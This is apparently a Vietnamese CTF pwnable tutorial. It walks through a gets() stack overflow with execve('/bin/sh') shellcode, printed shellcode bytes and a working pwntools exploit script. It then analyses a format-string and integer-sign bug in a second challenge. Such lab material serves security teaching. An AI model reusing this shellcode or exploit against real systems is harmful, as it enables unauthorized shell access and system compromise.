# Introduction to Pwnable
## Challenge 1
### Description
Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main() {
        char buffer[32];
        printf("DEBUG: %p\n", buffer);
        gets(buffer);
}
```

Để gọi được shell từ chương trình này, ta có thể truyền shellcode vào `buffer`, sau đó ghi đè `return address` của hàm main bằng địa chỉ bắt đầu của buffer. Lúc này, ghi hàm `main` kết thúc, tiến trình sẽ nhảy đến `buffer` và thực thi shellcode.  

### Exploit
#### Tính offset
Đầu tiên, ta debug chương trình và tìm địa chỉ của `buffer` và `return address` để tính offset.  

Đặt break points tại ngay sau khi hàm `gets` thực thi xong để tìm địa chỉ của `buffer` và ngay tại câu lệnh `ret` của hàm `main` để tìm địa chỉ của `return address`.  

![image](https://user-images.githubusercontent.com/44528004/145716119-399b31f3-0615-4c81-983e-505d6b117893.png)

Chạy chương trình với input là `AAAA`.  

![image](https://user-images.githubusercontent.com/44528004/145716136-6c4beecd-8d25-48cc-8f8d-b765461254f9.png)

Khi chương trình dừng lại tại break point đầu tiên, ta có thể thấy thanh ghi `$rax` lưu kết quả trả về của hàm `gets` và đang lưu địa chỉ của `buffer` `0x00007fffffffdec0`. Do `buffer` là biến cục bộ nên nó sẽ được lưu trên stack, vì vậy địa chỉ này chính là 1 ô nhớ trên stack.  

![image](https://user-images.githubusercontent.com/44528004/145716156-25b6145e-0a5c-4768-a1e8-d92506d7d15a.png)

Tại break point thứ 2, đỉnh của stack đang lưu giá trị của `return address` và đỉnh của stack lúc này đang là `0x00007fffffffdee8`.  

![image](https://user-images.githubusercontent.com/44528004/145716241-273b54e2-98ee-47d1-b146-4ca65633e731.png)

Từ các thông tin trên, ta tính được offset là `0x00007fffffffdee8 - 0x00007fffffffdec0 = 40` bytes. Vậy ta cần truyền vào buffer 40 bytes và thêm 8 bytes để ghi đè `return address`. Ở đây, shellcode sẽ được ghi vào 40 bytes này và `return address` sẽ được ghi đè bằng địa chỉ của `buffer`.

#### Lấy shellcode
Ở các bài trước, ta có assembly code sau để gọi `/bin/sh`:
```asm
section .text
global _start
_start:
        xor rax,rax
        push rax
        mov rbx,'/bin//sh'
        xor rsi,rsi
        xor rdx,rdx
        push rbx
        push rsp
        pop rdi
        mov al,0x3b
        syscall
```

Compile đoạn code assembly.
```bash
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
```

Dùng `objdump` để xem shellcode của file object vừa compile:
```bash
└─$ objdump -d shellcode.o      

shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 31 c0                xor    %rax,%rax
   3:   50                      push   %rax
   4:   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
   b:   2f 73 68 
   e:   48 31 f6                xor    %rsi,%rsi
  11:   48 31 d2                xor    %rdx,%rdx
  14:   53                      push   %rbx
  15:   54                      push   %rsp
  16:   5f                      pop    %rdi
  17:   b0 3b                   mov    $0x3b,%al
  19:   0f 05                   syscall
```

Với đoạn code assembly này, ta có shellcode là:
```
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
```

Tuy nhiên, khi sử dụng shellcode này thì mình exploit không thành công nên mình thử bỏ câu lệnh `xor %rax,%rax` thì ta có shellcode là:
```
\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05
```

Lúc này thì mình exploit thành công. Script exploit:
```python
from pwn import *

p = process('./demo')

shellcode = b'\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05'
p.recvuntil('DEBUG: ')
buffer_addr = int(p.recv().strip()[2:], 16)

payload = shellcode + b'A' * (40 - len(shellcode)) + p64(buffer_addr)

with open('payload.in', 'wb') as f:
    f.write(payload)

p.sendline(payload)
p.interactive()
```

## Challenge 2
### Description
Source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
        char name[0x40];
        char shell[16] = "/bin/sh\x00";
        if (strncmp(name, "Nghi Hoang Khoa dep trai", 24) == 0) {
                puts("Chuc mung ban da khong bi diem liet");
                system(shell);
        }
}

void vuln() {
        int len = 0, f = 0;
        char message[0x50];
        printf("Nhap do dai tin nhan: ");
        scanf("%d", &len);
        if (len < 0x50) {
                read(0, message, len);
                printf(message);
                puts("Ban co muon sua lai tin nhan khong?");
                puts("1. Co");
                puts("2. Khong");
                scanf("%d", &f);
                if (f == 1) {
                        read(0, message, len);
                }
        }
}

int main() {
        setbuf(stdin, 0);
        setbuf(stdout, 0);
        vuln();
        return 0;
}
```

### Observation
Từ source code, ta thấy rằng, chương trình sẽ yêu cầu ta nhập độ dài của tin nhắn và lưu vào `len`. Nếu `len < 0x50`, ta sẽ nhập message và sau đó ta có thêm 1 lần sửa lại message.  

Tuy nhiên, ở lần đọc `message` đầu tiên, `message` sẽ được in ra màn hình bằng hàm `printf`. Do đó, ta có thể khai thác hàm `printf` này để leak địa chỉ và giá trị trên stack.  

Bên cạnh đó, thông qua `checksec`, ta thấy được là chương trình này được bật đầy đủ chế độ bảo vệ.  
```
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

### Exploit
Mở ghidra để xem pseudocode của hàm `vuln`.  

![image](https://user-images.githubusercontent.com/44528004/145931692-b94b7ab9-db0a-46d3-b79f-1e626942c81b.png)  

Ở đây, ta thấy rằng, `len` là được khai báo là `uint`, nhưng `len` được so sánh với `0x50` thì `len` được convert sang `int`. Sau đó, nếu `int(len) < 0x50`, ta sẽ được ghi giá trị vào message nhưng với `len` lúc này là `ulong`. Điều này cho thấy, nếu ta truyền `len` là một số `>= 0x80000000` thì `int(len)` sẽ luôn nhỏ hơn `0x50` vì từ 1 số không dấu `0x80000000` được convert sang 1 số có dấu thì sẽ trở thành số âm. Và số âm thì luôn `< 0x50` nên sẽ luôn thoả điều kiện. Bên cạnh đó, khi hàm `read` được thực thi, `len` lại được dùng như là 1 số không dấu nên lúc này độ dài message mà ta có thể ghi là rất lớn.
